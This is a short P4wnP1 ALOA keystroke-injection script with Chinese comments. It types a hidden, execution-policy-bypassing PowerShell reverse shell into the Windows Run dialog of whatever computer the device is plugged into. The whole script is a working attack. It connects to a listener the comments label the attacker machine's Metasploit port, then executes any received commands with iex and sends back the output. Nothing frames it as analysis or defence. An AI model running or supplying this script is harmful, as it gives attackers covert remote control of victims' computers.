// P4WNP1 ALOA - Windows Reverse Shell (Direct)
// 直连版 - 直接输入命令，无需HTTP服务器

// ===== CONFIG =====
var LISTENER_IP = "192.168.146.145";  // 攻击机 IP
var LISTENER_PORT = "4444";           // MSF 监听端口
// ==================

layout("US");
typingSpeed(0,0);

// 打开运行窗口
press("GUI r");
delay(500);

// 直接输入反弹shell命令
type("powershell -nop -w hidden -ep bypass -c \"");
delay(200);

type("$c=New-Object 'Net.Sockets.TCPClient'");
delay(100);
type("('" + LISTENER_IP + "'," + LISTENER_PORT + ")");
delay(100);
type(";$s=$c.GetStream()");
delay(100);
type(";[byte[]]$z=0..65535|%{0}");
delay(100);
type(";while($i=$s.Read($z,0,$z.Length))");
delay(100);
type("{");
delay(100);
type("$d=(New-Object Text.ASCIIEncoding).GetString($z,0,$i)");
delay(100);
type(";$r=(iex $d 2>&1|Out-String)");
delay(100);
type(";$rb=([Text.Encoding]::ASCII).GetBytes($r)");
delay(100);
type(";$s.Write($rb,0,$rb.Length)}");
delay(100);
type(";$c.Close()");

delay(200);
type("\"");
delay(200);

press("ENTER");
